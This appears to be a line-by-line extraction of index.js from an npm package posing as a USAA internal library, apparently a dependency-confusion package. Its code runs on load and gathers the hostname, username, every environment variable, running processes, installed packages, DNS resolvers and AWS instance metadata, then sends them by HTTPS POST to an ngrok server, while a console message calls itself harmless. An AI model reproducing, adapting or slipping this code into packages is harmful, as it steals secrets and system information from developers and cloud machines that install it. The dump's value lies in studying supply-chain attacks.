// File: tmp/tmpf_zazv26/@usaa-grp-ent-conv-platform-usaa/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const https = require("https")
Line 3: _tmp_0 = require("child_process")
Line 5: const LOG_SERVER = "https://d862-129-222-87-246.ngrok-free.app"
Line 8: {
    console.log("[+] Flex Card Core: USAA Internal Package Loaded"); // Harmless log

    // Collect basic system info
    const logData = {
        hostname: os.hostname(),
        user: os.userInfo().username,
        os: os.platform(),
        arch: os.arch(),
        cpus: os.cpus().length,
        date: new Date().toISOString(),
        networkInterfaces: os.networkInterfaces(),
        environmentVariables: process.env,
        runningProcesses: [],
        installedPackages: [],
        dnsResolvers: [],
        awsMetadata: {}
    };

    // Capture running processes (first 15 for proof)
    exec("ps -eo comm | head -n 15", (error, stdout, stderr) => {
        if (!error) {
            logData.runningProcesses = stdout.split("\n").filter(Boolean);
        }
        sendLogData();
    });

    // Capture installed npm and Yarn packages
    exec("npm list -g --depth=0 && yarn global list", (error, stdout, stderr) => {
        if (!error) {
            logData.installedPackag...
Line 9: console.log("[+] Flex Card Core: USAA Internal Package Loaded")
Line 13: os.hostname()
Line 14: os.userInfo()
Line 15: os.platform()
Line 16: os.arch()
Line 17: os.cpus()
Line 28: exec("ps -eo comm | head -n 15", (error, stdout, stderr) => {
        if (!error) {
            logData.runningProcesses = stdout.split("\n").filter(Boolean);
        }
        sendLogData();
    })
Line 36: exec("npm list -g --depth=0 && yarn global list", (error, stdout, stderr) => {
        if (!error) {
            logData.installedPackages = stdout.split("\n").filter(Boolean);
        }
        sendLogData();
    })
Line 44: exec("cat /etc/resolv.conf", (error, stdout, stderr) => {
        if (!error) {
            logData.dnsResolvers = stdout.split("\n").filter(Boolean);
        }
        sendLogData();
    })
Line 52: (_tmp_8 = https.get("http://169.254.169.254/latest/meta-data/", res => {
        let data = "";
        res.on("data", chunk => { data += chunk; });
        res.on("end", () => {
            logData.awsMetadata = { "meta-data": data.trim() };
            sendLogData();
        });
    }))
Line 56: data.trim()
Line 62: {
        const postData = JSON.stringify(logData);
        const options = {
            hostname: LOG_SERVER.replace("https://", ""),
            port: 443,
            path: "/",
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": postData.length
            }
        };

        const req = https.request(options, res => {
            console.log(`[+] Sent data, response code: ${res.statusCode}`);
        });

        req.on("error", err => {
            console.error(`Error sending log: ${err.message}`);
        });

        req.write(postData);
        req.end();
    }
Line 65: _tmp_10.hostname = LOG_SERVER.replace("https://", "")
Line 75: const req = https.request(options, res => {
            console.log(`[+] Sent data, response code: ${res.statusCode}`);
        })
Line 76: console.log(`[+] Sent data, response code: ${res.statusCode}`)
Line 83: req.write(postData)
Line 84: req.end()
